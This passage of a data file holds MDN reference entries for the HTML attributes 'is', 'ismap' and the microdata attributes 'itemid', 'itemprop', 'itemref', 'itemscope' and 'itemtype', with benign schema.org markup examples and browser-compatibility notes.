  description: "# is\n\n## Limited availability\n\nThis feature is not Baseline because it does not work in some of the most widely-used browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FGlobal_attributes%2Fis&level=not)\n\n**Note:** [Safari does not plan to support custom built-in elements](https://github.com/WebKit/standards-positions/issues/97) and [browser vendors are exploring alternative solutions to customizing built-ins](https://github.com/WICG/webcomponents/issues/1029). Check the [browser compatibility](#browser_compatibility) section for support information.\n\nThe `is` [global attribute](../global_attributes) allows you to specify that a standard HTML element should behave like a defined custom built-in element (see [Using custom elements](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_custom_elements) for more details).\n\nThis attribute can only be used if the specified custom element name has been successfully [defined](https://developer.mozilla.org/en-US/docs/Web/API/CustomElementRegistry/define) in the current document, and extends the element type it is being applied to.\n\n## Examples\n\nThe following code is taken from our [word-count-web-component](https://github.com/mdn/web-components-examples/tree/main/word-count-web-component) example ([see it live also](https://mdn.github.io/web-components-examples/word-count-web-component/)).\n\njs\n\n```\n// Create a class for the element\nclass WordCount extends HTMLParagraphElement {\n  constructor() {\n    // Always call super first in constructor\n    super();\n\n    // Constructor contents omitted for brevity\n    // …\n  }\n}\n\n// Define the new element\ncustomElements.define(\"word-count\", WordCount, { extends: \"p\" });\n```\n\nhtml\n\n```\n<p is=\"word-count\"></p>\n```\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|      | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|      | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `is` | 67      | 79   | 63      | 54    | No     | 67             | 63                  | 48            | No            | 9.0              | 67              |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/is](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/is)"
- name: ismap (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`ismap`](element/img#ismap)

    [`<img>`](element/img)

    Indicates that the image is part of a server-side image map.
- name: itemid (attribute)
  summary: The itemid global attribute provides microdata in the form of a unique, global identifier of an item
  description: "# itemid\n\nThe `itemid` [global attribute](../global_attributes) provides microdata in the form of a unique, global identifier of an item.\n\nAn `itemid` attribute can only be specified for an element that has both [`itemscope`](itemscope) and [`itemtype`](itemtype) attributes. Also, `itemid` can only be specified on elements that possess an `itemscope` attribute whose corresponding `itemtype` refers to or defines a vocabulary that supports global identifiers.\n\nThe exact meaning of an `itemtype`'s global identifier is provided by the definition of that identifier within the specified vocabulary. The vocabulary defines whether several items with the same global identifier can coexist and, if so, how items with the same identifier are handled.\n\n**Note:** The [WHATWG](https://developer.mozilla.org/en-US/docs/Glossary/WHATWG) definition specifies that an `itemid` must be a [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL). However, the following example correctly illustrates that a [URN](https://developer.mozilla.org/en-US/docs/Glossary/URN) may also be used. This inconsistency may reflect the incomplete nature of the Microdata specification.\n\n## Examples\n\n### Representing structured data for a book\n\nThis example uses microdata attributes to represent the following structured data:\n\n|           |                  |                                                 |                         |\n|-----------|------------------|-------------------------------------------------|-------------------------|\n| itemscope | itemtype: itemid | https://schema.org/Book: urn:isbn:0-374-22848-5 |                         |\n|           | itemprop         | title                                           | Owls of the Eastern Ice |\n|           | itemprop         | author                                          | Jonathan C Slaght       |\n|           | itemprop         | datePublished                                   | 2020-08-04              |\n\n#### HTML\n\nhtml\n\n```\n<dl\n  itemscope\n  itemtype=\"https://schema.org/Book\"\n  itemid=\"urn:isbn:0-374-22848-5<\">\n  <dt>Title</dt>\n  <dd itemprop=\"title\">Owls of the Eastern Ice</dd>\n  <dt>Author</dt>\n  <dd itemprop=\"author\">Jonathan C Slaght</dd>\n  <dt>Publication date</dt>\n  <dd>\n    <time itemprop=\"datePublished\" datetime=\"2020-08-04\">August 4 2020</time>\n  </dd>\n</dl>\n```\n\n#### Result\n\n## Specifications\n\n[TABLE]\n\n## See also\n\n- All [global attributes](../global_attributes).\n- Other microdata related global attributes:\n  - [`itemprop`](itemprop)\n  - [`itemref`](itemref)\n  - [`itemscope`](itemscope)\n  - [`itemtype`](itemtype)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemid](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemid)"
- name: itemprop (attribute)
  summary: The itemprop global attribute is used to add properties to an item
  description: "# itemprop\n\nThe `itemprop` [global attribute](../global_attributes) is used to add properties to an item. Every HTML element can have an `itemprop` attribute specified, and an `itemprop` consists of a name-value pair. Each name-value pair is called a **property**, and a group of one or more properties forms an **item**. Property values are either a string or a URL and can be associated with a very wide range of elements including [`<audio>`](../element/audio), [`<embed>`](../element/embed), [`<iframe>`](../element/iframe), [`<img>`](../element/img), [`<link>`](../element/link), [`<object>`](../element/object), [`<source>`](../element/source), [`<track>`](../element/track), and [`<video>`](../element/video).\n\n## Examples\n\nThe example below shows the source for a set of elements marked up with `itemprop` attributes, followed by a table showing the resulting structured data.\n\n### HTML\n\nhtml\n\n```\n<div itemscope itemtype=\"http://schema.org/Movie\">\n  <h1 itemprop=\"name\">Avatar</h1>\n  <span>\n    Director:\n    <span itemprop=\"director\">James Cameron</span>\n    (born August 16, 1954)\n  </span>\n  <span itemprop=\"genre\">Science fiction</span>\n  <a href=\"../movies/avatar-theatrical-trailer.html\" itemprop=\"trailer\">\n    Trailer\n  </a>\n</div>\n```\n\n### Structured data\n\n|          |                   |                                          |\n|----------|-------------------|------------------------------------------|\n|          | **Item**          |                                          |\n|          | **itemprop name** | **itemprop value**                       |\n| itemprop | name              | Avatar                                   |\n| itemprop | director          | James Cameron                            |\n| itemprop | genre             | Science fiction                          |\n| itemprop | trailer           | ../movies/avatar-theatrical-trailer.html |\n\n## Properties\n\nProperties have values that are either a string or a URL. When a string value is a URL, it is expressed using the [`<a>`](../element/a) element and its [`href`](../element/a#href) attribute, the [`<img>`](../element/img) element and its [`src`](../element/img#src) attribute, or other elements that link to or embed external resources.\n\n### Three properties with values that are strings\n\nhtml\n\n```\n<div itemscope>\n  <p>My name is <span itemprop=\"name\">Neil</span>.</p>\n  <p>My band is called <span itemprop=\"band\">Four Parts Water</span>.</p>\n  <p>I am <span itemprop=\"nationality\">British</span>.</p>\n</div>\n```\n\n### One property, \"image\", whose value is a URL\n\nhtml\n\n```\n<div itemscope>\n  <img itemprop=\"image\" src=\"google-logo.png\" alt=\"Google\" />\n</div>\n```\n\nWhen a string value can't be easily read and understood by a person (e.g., a long string of numbers and letters), it can be displayed using the value attribute of the data element, with the more easily-understood-by-a human-version given in the element's contents (which is not part of the structured data - see example below).\n\n### An item with a property whose value is a product ID\n\nThe ID is not human-friendly, so the product's name is used instead.\n\nhtml\n\n```\n<h1 itemscope>\n  <data itemprop=\"product-id\" value=\"9678AOU879\">The Instigator 2000</data>\n</h1>\n```\n\nFor numeric data, the meter element and its value attribute can be used.\n\n### A meter element\n\nhtml\n\n```\n<div itemscope itemtype=\"http://schema.org/Product\">\n  <span itemprop=\"name\">Panasonic White 60L Refrigerator</span>\n  <img src=\"panasonic-fridge-60l-white.jpg\" alt=\"\" />\n  <div\n    itemprop=\"aggregateRating\"\n    itemscope\n    itemtype=\"http://schema.org/AggregateRating\">\n    <meter itemprop=\"ratingValue\" min=\"0\" value=\"3.5\" max=\"5\">\n      Rated 3.5/5\n    </meter>\n    (based on <span itemprop=\"reviewCount\">11</span>\n    customer reviews)\n  </div>\n</div>\n```\n\nSimilarly, for date- and time-related data, the time element and its datetime attribute can be used.\n\n### An item with one property, \"birthday\", whose value is a date\n\nhtml\n\n```\n<div itemscope>\n  I was born on\n  <time itemprop=\"birthday\" datetime=\"1984-05-10\">May 10th 1984</time>.\n</div>\n```\n\nProperties can also be groups of name-value pairs, by putting the itemscope attribute on the element that declares the property. Each value is either a string or a group of name-value pairs (i.e. an item).\n\n### An outer item representing a person, and an inner one representing a band\n\nhtml\n\n```\n<div itemscope>\n  <p>Name: <span itemprop=\"name\">Amanda</span></p>\n  <p>\n    Band:\n    <span itemprop=\"band\" itemscope>\n      <span itemprop=\"name\">Jazz Band</span>\n      (<span itemprop=\"size\">12</span> players)\n    </span>\n  </p>\n</div>\n```\n\nThe outer item above has two properties, \"name\" and \"band\". The \"name\" is \"Amanda\", and the \"band\" is an item in its own right, with two properties, \"name\" and \"size\". The \"name\" of the band is \"Jazz Band\", and the \"size\" is \"12\". The outer item in this example is a top-level microdata item. Items that are not part of others are called top-level microdata items.\n\n### All the properties separated from their items\n\nThis example is the same as the previous one, but all the properties are separated from their items.\n\nhtml\n\n```\n<div itemscope id=\"amanda\" itemref=\"a b\"></div>\n<p id=\"a\">Name: <span itemprop=\"name\">Amanda</span></p>\n<div id=\"b\" itemprop=\"band\" itemscope itemref=\"c\"></div>\n<div id=\"c\">\n  <p>Band: <span itemprop=\"name\">Jazz Band</span></p>\n  <p>Size: <span itemprop=\"size\">12</span> players</p>\n</div>\n```\n\nThis gives the same result as the previous example. The first item has two properties, \"name\", set to \"Amanda\", and \"band\", set to another item. That second item has two further properties, \"name\", set to \"Jazz Band\", and \"size\", set to \"12\".\n\nAn item can have multiple properties with the same name and different values.\n\n### Ice cream with two flavors\n\nhtml\n\n```\n<div itemscope>\n  <p>Flavors in my favorite ice cream:</p>\n  <ul>\n    <li itemprop=\"flavor\">Lemon sorbet</li>\n    <li itemprop=\"flavor\">Apricot sorbet</li>\n  </ul>\n</div>\n```\n\nThis results in an item with two properties, both with the name \"flavor\" and having the values \"Lemon sorbet\" and \"Apricot sorbet\".\n\nAn element introducing a property can also introduce multiple properties at once, to avoid duplication when some of the properties have the same value.\n\n### An item with two properties, \"favorite-color\" and \"favorite-fruit\", both set to the value \"orange\"\n\nhtml\n\n```\n<div itemscope>\n  <span\n    itemprop=\"favorite-color\n    favorite-fruit\"\n    >orange\n  </span>\n</div>\n```\n\n**Note:** There is no relationship between the microdata and the content of the document where the microdata is marked up.\n\n### Same structured data marked up in two different ways\n\nThere is no semantic difference between the following two examples\n\nhtml\n\n```\n<figure>\n  <img src=\"castle.jpeg\" />\n  <figcaption>\n    <span itemscope><span itemprop=\"name\">The Castle</span></span> (1986)\n  </figcaption>\n</figure>\n```\n\nhtml\n\n```\n<span itemscope><meta itemprop=\"name\" content=\"The Castle\" /></span>\n<figure>\n  <img src=\"castle.jpeg\" />\n  <figcaption>The Castle (1986)</figcaption>\n</figure>\n```\n\nBoth have a figure with a caption, and both, completely unrelated to the figure, have an item with a name-value pair with the name \"name\" and the value \"The Castle\". The only difference is that if the user drags the figcaption out of the document, the item will be included in the drag-and-drop data. The image associated with the item won't be included.\n\n## Names and values\n\nA property is an unordered set of unique tokens that are case-sensitive and represent the name-value pairs. The property value must have at least one token. In the example below, each data cell is a token.\n\n### Names examples\n\n|          | Item                                                |                                                     |\n|----------|-----------------------------------------------------|-----------------------------------------------------|\n|          | itemprop **name**                                   | itemprop **value**                                  |\n| itemprop | country                                             | Ireland                                             |\n| itemprop | Option                                              | 2                                                   |\n| itemprop | https://www.flickr.com/photos/nlireland/6992065114/ | Ring of Kerry                                       |\n| itemprop | img                                                 | https://www.flickr.com/photos/nlireland/6992065114/ |\n| itemprop | website                                             | flickr                                              |\n| itemprop | (token)                                             | (token)                                             |\n\n**Tokens** are either strings or URL's. An item is called a **typed item** if it is a URL. Otherwise, it is a string. Strings cannot contain a period or a colon (see below).\n\n1.  If the item is a typed item it must be either:\n    1.  A defined property name, or\n    2.  A valid URL, which refers to the vocabulary definition, or\n    3.  A valid URL that is used as a proprietary item property name (i.e. one not defined in a public specification), or\n2.  If the item is not a typed item it must be:\n    1.  A string that contains no \"`.`\" (U+002E FULL STOP) characters and no \"`:`\" characters (U+003A COLON) and is used as a proprietary item property name (again, one not defined in a public specification).\n\n**Note:** The rules above disallow \":\" characters in non-URL values because otherwise they could not be distinguished from URLs. Values with \".\" characters are reserved for future extensions. Space characters are disallowed because otherwise the values would be parsed as multiple tokens.\n\n## Values\n\nThe property value of a name-value pair is as given for the first matching case in the following list:\n\n- If the element has an `itemscope` attribute\n  - The value is the **item** created by the element\n- If the element is a `meta` element\n  - The value is the value of the element's `content` attribute\n- If the element is an `audio`, `embed`, `iframe`, `img`, `source`, `track`, or `video` element\n  - The value is the resulting URL string that results from parsing the value of the element's src attribute relative to the node document (part of the [Microdata DOM API](../microdata)) of the element at the time the attribute is set\n- If the element is an `a`, `area`, or `link` element\n  - The value is the resulting URL string that results from parsing the value of the element's href attribute relative to the node document of the element at the time the attribute is set\n- If the element is an `object` element\n  - The value is the resulting URL string that results from parsing the value of the element's data attribute relative to the node document of the element at the time the attribute is set\n- If the element is a `data` element\n  - The value is the value of the element's value attribute\n- If the element is a `meter` element\n  - The value is the value of the element's `value` attribute\n- If the element is a `time` element\n  - The value is the element's `datetime` value\n\nOtherwise\n\n- The value is the element's *textContent*.\n\nIf a property's value is a `URL`, the property must be specified using a URL property element. The URL property elements are the `a`, `area`, `audio`, `embed`, `iframe`, `img`, `link`, `object`, `source`, `track`, and `video` elements.\n\n### Name order\n\nNames are unordered relative to each other, but if a particular name has multiple values, they do have a relative order.\n\nIn the following example, the \"a\" property has the values \"1\" and \"2\", *in that order*, but whether the \"a\" property comes before the \"b\" property or not is not important.\n\nhtml\n\n```\n<div itemscope>\n  <p itemprop=\"a\">1</p>\n  <p itemprop=\"a\">2</p>\n  <p itemprop=\"b\">test</p>\n</div>\n```\n\nHere are several equivalent examples:\n\nhtml\n\n```\n<div itemscope>\n  <p itemprop=\"b\">test</p>\n  <p itemprop=\"a\">1</p>\n  <p itemprop=\"a\">2</p>\n</div>\n```\n\nhtml\n\n```\n<div itemscope>\n  <p itemprop=\"a\">1</p>\n  <p itemprop=\"b\">test</p>\n  <p itemprop=\"a\">2</p>\n</div>\n```\n\nhtml\n\n```\n<div id=\"x\">\n  <p itemprop=\"a\">1</p>\n</div>\n<div itemscope itemref=\"x\">\n  <p itemprop=\"b\">test</p>\n  <p itemprop=\"a\">2</p>\n</div>\n```\n\n### Representing structured data for a book\n\nThis example uses microdata attributes to represent the following structured data:\n\n|           |                  |                                                 |                         |\n|-----------|------------------|-------------------------------------------------|-------------------------|\n| itemscope | itemtype: itemid | https://schema.org/Book: urn:isbn:0-374-22848-5 |                         |\n|           | itemprop         | title                                           | Owls of the Eastern Ice |\n|           | itemprop         | author                                          | Jonathan C Slaght       |\n|           | itemprop         | datePublished                                   | 2020-08-04              |\n\n#### HTML\n\nhtml\n\n```\n<dl\n  itemscope\n  itemtype=\"https://schema.org/Book\"\n  itemid=\"urn:isbn:0-374-22848-5<\">\n  <dt>Title</dt>\n  <dd itemprop=\"title\">Owls of the Eastern Ice</dd>\n  <dt>Author</dt>\n  <dd itemprop=\"author\">Jonathan C Slaght</dd>\n  <dt>Publication date</dt>\n  <dd>\n    <time itemprop=\"datePublished\" datetime=\"2020-08-04\">August 4 2020</time>\n  </dd>\n</dl>\n```\n\n#### Result\n\n## Specifications\n\n[TABLE]\n\n## See also\n\n- [Other different global attributes](../global_attributes)\n- Other microdata related global attributes:\n  - [`itemid`](itemid)\n  - [`itemref`](itemref)\n  - [`itemscope`](itemscope)\n  - [`itemtype`](itemtype)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemprop](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemprop)"
- name: itemref (attribute)
  summary: Properties that are not descendants of an element with the itemscope attribute can be associated with an item using the global attribute itemref
  description: "# itemref\n\nProperties that are not descendants of an element with the [`itemscope`](itemscope) attribute can be associated with an item using the [global attribute](../global_attributes) `itemref`.\n\n`itemref` provides a list of element IDs (not `itemid`s) elsewhere in the document, with additional properties\n\nThe `itemref` attribute can only be specified on elements that have an `itemscope` attribute specified.\n\n**Note:** The `itemref` attribute is not part of the microdata data model. It is merely a syntactic construct to aid authors in adding annotations to pages where the data to be annotated does not follow a convenient tree structure. For example, it allows authors to mark up data in a table so that each column defines a separate item while keeping the properties in the cells.\n\n## Examples\n\n### Representing structured data for a band\n\nThis example uses microdata attributes to represent the following structured data (in [JSON-LD](https://json-ld.org/) format):\n\njson\n\n```\n{\n  \"@id\": \"amanda\",\n  \"name\": \"Amanda\",\n  \"band\": {\n    \"@id\": \"b\",\n    \"name\": \"Jazz Band\",\n    \"size\": 12\n  }\n}\n```\n\n#### HTML\n\nhtml\n\n```\n<div itemscope id=\"amanda\" itemref=\"a b\"></div>\n<p id=\"a\">Name: <span itemprop=\"name\">Amanda</span></p>\n<div id=\"b\" itemprop=\"band\" itemscope itemref=\"c\"></div>\n<div id=\"c\">\n  <p>Band: <span itemprop=\"name\">Jazz Band</span></p>\n  <p>Size: <span itemprop=\"size\">12</span> players</p>\n</div>\n```\n\n#### Result\n\n## Specifications\n\n[TABLE]\n\n## See also\n\n- [Other different global attributes](../global_attributes)\n- Other microdata related global attributes:\n  - [`itemid`](itemid)\n  - [`itemprop`](itemprop)\n  - [`itemscope`](itemscope)\n  - [`itemtype`](itemtype)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemref](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemref)"
- name: itemscope (attribute)
  summary: itemscope is a boolean global attribute that defines the scope of associated metadata
  description: "# itemscope\n\n`itemscope` is a boolean [global attribute](../global_attributes) that defines the scope of associated metadata. Specifying the `itemscope` attribute for an element creates a new item, which results in a number of name-value pairs that are associated with the element.\n\nA related attribute, [`itemtype`](itemtype), is used to specify the valid URL of a vocabulary (such as [schema.org](https://schema.org/)) that describes the item and its properties context. In each of the following examples, the vocabulary is from [schema.org](https://schema.org/).\n\nEvery HTML element may have an `itemscope` attribute specified. An `itemscope` element that does not have an associated `itemtype` must have an associated `itemref`.\n\n**Note:** Find more about `itemtype` attributes at [https://schema.org/Thing](https://schema.org/Thing)\n\n### itemscope id attributes\n\nWhen you specify the `itemscope` attribute for an element, a new item is created. The item consists of a group of name-value pairs. For elements with an `itemscope` attribute and an `itemtype` attribute, you may also specify an [`id`](../global_attributes#id) attribute. You can use the `id` attribute to set a global identifier for the new item. A global identifier allows the item to relate to other items found on pages across the Web.\n\n## Examples\n\n### Representing structured data for a movie\n\nThe following example specifies the `itemtype` as \"[http://schema.org/Movie](https://schema.org/Movie)\", and specifies four related `itemprop` attributes.\n\n|           |          |                 |                              |\n|-----------|----------|-----------------|------------------------------|\n| itemscope | Itemtype | Movie           |                              |\n|           | itemprop | (itemprop name) | (itemprop value)             |\n|           | itemprop | director        | James Cameron                |\n|           | itemprop | genre           | Science Fiction              |\n|           | itemprop | name            | Avatar                       |\n|           | itemprop | Trailer         | https://youtu.be/0AY1XIkX7bY |\n\nhtml\n\n```\n<div itemscope itemtype=\"https://schema.org/Movie\">\n  <h1 itemprop=\"name\">Avatar</h1>\n  <span>\n    Director: <span itemprop=\"director\">James Cameron</span> (born August 16,\n    1954)\n  </span>\n  <span itemprop=\"genre\">Science fiction</span>\n  <a href=\"https://youtu.be/0AY1XIkX7bY\" itemprop=\"trailer\">Trailer</a>\n</div>\n```\n\n### Representing structured data for a recipe\n\nThere are four `itemscope` attributes in the following example. Each `itemscope` attribute sets the scope of its corresponding `itemtype` attribute. The `itemtype`s, `Recipe`, `AggregateRating`, and `NutritionInformation` in the following example are part of the [schema.org](https://www.schema.org/) structured data for a recipe, as specified by the first `itemtype`, `http://schema.org/Recipe`.\n\n|           |                      |                                     |                                                                                          |\n|-----------|----------------------|-------------------------------------|------------------------------------------------------------------------------------------|\n| itemscope | itemtype             | Recipe                              |                                                                                          |\n|           | itemprop             | name                                | Grandma's Holiday Apple Pie                                                              |\n|           | itemprop             | image                               | https://c1.staticflickr.com/1/30/42759561_8631e2f905_n.jpg                               |\n|           | itemprop             | datePublished                       | 2022-11-05                                                                               |\n|           | itemprop             | description                         | This is my grandmother's apple pie recipe. I like to add a dash of nutmeg.               |\n|           | itemprop             | prepTime                            | PT30M                                                                                    |\n|           | itemprop             | cookTime                            | PT1H                                                                                     |\n|           | itemprop             | totalTime                           | PT1H30M                                                                                  |\n|           | itemprop             | recipeYield                         | 1 9\" pie (8 servings)                                                                    |\n|           | itemprop             | recipeIngredient                    | Thinly-sliced apples: 6 cups                                                             |\n|           | itemprop             | recipeIngredient                    | White sugar: 3/4 cup                                                                     |\n|           | itemprop             | recipeInstructions                  | 1\\. Cut and peel apples 2. Mix sugar and cinnamon. Use additional sugar for tart apples. |\n|           | itemprop             | author \\[Person\\]                   |                                                                                          |\n|           | itemprop             | name                                | Carol Smith                                                                              |\n| itemscope | itemprop\\[itemtype\\] | aggregateRating \\[AggregateRating\\] |                                                                                          |\n|           | itemprop             | ratingValue                         | 4.0                                                                                      |\n|           | itemprop             | reviewCount                         | 35                                                                                       |\n| itemscope | itemprop\\[itemtype\\] | nutrition \\[NutritionInformation\\]  |                                                                                          |\n|           | itemprop             | servingSize                         | 1 medium slice                                                                           |\n|           | itemprop             | calories                            | 250 cal                                                                                  |\n|           | itemprop             | fatContent                          | 12 g                                                                                     |\n\n**Note:** A handy tool for extracting microdata structures from HTML is Google's [Rich Results Testing Tool](https://search.google.com/test/rich-results). Try it on the HTML shown here.\n\n#### HTML\n\nhtml\n\n```\n<div itemscope itemtype=\"https://schema.org/Recipe\">\n  <h2 itemprop=\"name\">Grandma's Holiday Apple Pie</h2>\n  <img\n    itemprop=\"image\"\n    src=\"https://c1.staticflickr.com/1/30/42759561_8631e2f905_n.jpg\"\n    width=\"50\"\n    height=\"50\" />\n  <p>\n    By\n    <span itemprop=\"author\" itemscope itemtype=\"https://schema.org/Person\">\n      <span itemprop=\"name\">Carol Smith</span>\n    </span>\n  </p>\n  <p>\n    Published:\n    <time datetime=\"2022-11-05\" itemprop=\"datePublished\">\n      November 5, 20022\n    </time>\n  </p>\n  <span itemprop=\"description\">\n    This is my grandmother's apple pie recipe. I like to add a dash of nutmeg.\n  </span>\n  <br />\n  <span\n    itemprop=\"aggregateRating\"\n    itemscope\n    itemtype=\"https://schema.org/AggregateRating\">\n    <span itemprop=\"ratingValue\">4.0</span> stars based on\n    <span itemprop=\"reviewCount\">35</span> reviews\n  </span>\n  <br />\n  Prep time: <time datetime=\"PT30M\" itemprop=\"prepTime\">30 min</time>\n  <br />\n  Cook time: <time datetime=\"PT1H\" itemprop=\"cookTime\">1 hour</time>\n  <br />\n  Total time: <time datetime=\"PT1H30M\" itemprop=\"totalTime\">1 hour 30 min</time>\n  <br />\n  Yield: <span itemprop=\"recipeYield\">1 9\" pie (8 servings)</span>\n  <br />\n  <span\n    itemprop=\"nutrition\"\n    itemscope\n    itemtype=\"https://schema.org/NutritionInformation\">\n    Serving size: <span itemprop=\"servingSize\">1 medium slice</span><br />\n    Calories per serving: <span itemprop=\"calories\">250 cal</span><br />\n    Fat per serving: <span itemprop=\"fatContent\">12 g</span><br />\n  </span>\n  <p>\n    Ingredients:<br />\n    <span itemprop=\"recipeIngredient\">Thinly-sliced apples: 6 cups<br /></span>\n    <span itemprop=\"recipeIngredient\">White sugar: 3/4 cup<br /></span>\n    …\n  </p>\n  Directions: <br />\n  <div itemprop=\"recipeInstructions\">\n    1. Cut and peel apples<br />\n    2. Mix sugar and cinnamon. Use additional sugar for tart apples. <br />\n    …\n  </div>\n</div>\n```\n\n#### Result\n\n## Specifications\n\n[TABLE]\n\n## See also\n\n- [Other different global attributes](../global_attributes)\n- Other microdata related global attributes:\n  - [`itemid`](itemid)\n  - [`itemprop`](itemprop)\n  - [`itemref`](itemref)\n  - [`itemtype`](itemtype)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemscope](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/itemscope)"
- name: itemtype (attribute)
  summary: The global attribute itemtype specifies the URL of the vocabulary that will be used to define itemprop's (item properties) in the data structure
  description: "# itemtype\n\nThe [global attribute](../global_attributes) `itemtype` specifies the URL of the vocabulary that will be used to define `itemprop`'s (item properties) in the data structure.\n\n[`itemscope`](itemscope) is used to set the scope of where in the data structure the vocabulary set by `itemtype` will be active.\n\nGoogle and other major search engines support the [schema.org](https://schema.org/) vocabulary for structured data. This vocabulary defines a standard set of type names and property names. For example, `MusicEvent` indicates a concert performance, with [`startDate`](https://schema.org/startDate) and [`location`](https://schema.org/location) properties specifying the concert's key details. In this case, [`MusicEvent`](https://schema.org/MusicEvent) would be the URL used by `itemtype`, with `startDate` and location as `itemprop`'s which [`MusicEvent`](https://schema.org/MusicEvent) defines.\n\n**Note:** More about `itemtype` attributes can be found at [https://schema.org/Thing](https://schema.org/Thing)\n\n- The **itemtype** attribute must have a value that is an unordered set of unique tokens which are case-sensitive, each is a valid and absolute URL, and all defined to use the same vocabulary. The attribute's value must have at least one token.\n- The item types must all be types defined in applicable specifications (such as [schema.org](https://schema.org/)), and must all be defined to use the same vocabulary.\n- The itemtype attribute can only be specified on elements which have an itemscope attribute specified.\n- The itemid attribute can only be specified on elements which have both an itemscope attribute and an itemtype attribute specified. They must only be specified on elements with an itemscope attribute, whose itemtype attribute specifies a vocabulary not supporting global identifiers for items, as defined by that vocabulary's specification.\n- The exact meaning of a global identifier is determined by the vocabulary's specification. It is left to such specifications to define whether multiple items of the same global identifier (whether on the same page or different pages) are allowed to exist, and what processing rules for that vocabulary are, with respect to handling the case of multiple items with the same ID.\n\n## Examples\n\n### Representing structured data for a product\n\nThis example uses microdata attributes to represent structured data for a product, as follows:\n\n|           |                      |                                      |                                                                                                                                          |\n|-----------|----------------------|--------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|\n| itemscope | itemtype             | Product (https://schema.org/Product) |                                                                                                                                          |\n|           | itemprop             | name                                 | Executive Anvil                                                                                                                          |\n|           | itemprop             | image                                | https://pixabay.com/static/uploads/photo/2015/09/05/18/15/suitcase-924605_960_720.png                                                    |\n|           | itemprop             | description                          | Sleeker than ACME's Classic Anvil, the Executive Anvil is perfect for the business traveler looking for something to drop from a height. |\n|           | itemprop             | mpn                                  | 925872                                                                                                                                   |\n|           | itemprop             | brand \\[Thing\\]                      |                                                                                                                                          |\n|           | itemprop             | name                                 | ACME                                                                                                                                     |\n| itemscope | itemprop\\[itemtype\\] | aggregateRating\\[AggregateRating\\]   |                                                                                                                                          |\n|           | itemprop             | ratingValue                          | 4.4                                                                                                                                      |\n|           | itemprop             | reviewCount                          | 89                                                                                                                                       |\n|           | itemprop             | offers \\[Offer\\]                     | https://schema.org/Offer                                                                                                                 |\n|           | itemprop             | priceCurrency                        | USD                                                                                                                                      |\n|           | itemprop             | price                                | 119.99                                                                                                                                   |\n|           | itemprop             | priceValidUntil                      | 2020-11-05                                                                                                                               |\n|           | itemprop             | itemCondition                        | https://schema.org/UsedCondition                                                                                                         |\n|           | itemprop             | availability                         | https://schema.org/InStock                                                                                                               |\n| itemscope | itemprop\\[itemtype\\] | seller \\[Organization\\]              | https://schema.org/Organization                                                                                                          |\n|           | itemprop             | name                                 | Executive Objects                                                                                                                        |\n\n**Note:** A handy tool for extracting microdata structures from HTML is Google's [Structured Data Testing Tool](https://developers.google.com/search/docs/appearance/structured-data). Try it on the HTML shown here.\n\n#### HTML\n\nhtml\n\n```\n<div itemscope itemtype=\"https://schema.org/Product\">\n  <span itemprop=\"brand\">ACME<br /></span>\n  <span itemprop=\"name\">Executive Anvil<br /></span>\n  <img\n    itemprop=\"image\"\n    src=\"https://pixabay.com/static/uploads/photo/2015/09/05/18/15/suitcase-924605_960_720.png\"\n    width=\"50\"\n    height=\"50\"\n    alt=\"Executive Anvil logo\" /><br />\n\n  <span itemprop=\"description\">\n    Sleeker than ACME's Classic Anvil, the Executive Anvil is perfect for the\n    business traveler looking for something to drop from a height.\n    <br />\n  </span>\n\n  Product #: <span itemprop=\"mpn\">925872<br /></span>\n  <span\n    itemprop=\"aggregateRating\"\n    itemscope\n    itemtype=\"https://schema.org/AggregateRating\">\n    Rating: <span itemprop=\"ratingValue\">4.4</span> stars, based on\n    <span itemprop=\"reviewCount\">89 </span> reviews\n  </span>\n  <p>\n    <span itemprop=\"offers\" itemscope itemtype=\"https://schema.org/Offer\">\n      Regular price: $179.99<br />\n      <meta itemprop=\"priceCurrency\" content=\"USD\" />\n      <span itemprop=\"price\">Sale price: $119.99<br /></span>\n      (Sale ends\n      <time itemprop=\"priceValidUntil\" datetime=\"2020-11-05\">5 November!</time>)\n      <br />\n      Available from:\n      <span\n        itemprop=\"seller\"\n        itemscope\n        itemtype=\"https://schema.org/Organization\">\n        <span itemprop=\"name\">Executive Objects<br /></span>\n      </span>\n      Condition:\n      <link\n        itemprop=\"itemCondition\"\n        href=\"https://schema.org/UsedCondition\" />Previously owned, in excellent\n      condition<br />\n      <link itemprop=\"availability\" href=\"https://schema.org/InStock\" />In\n      stock! Order now!\n    </span>\n  </p>\n</div>\n```\n\n#### Result\n\n## 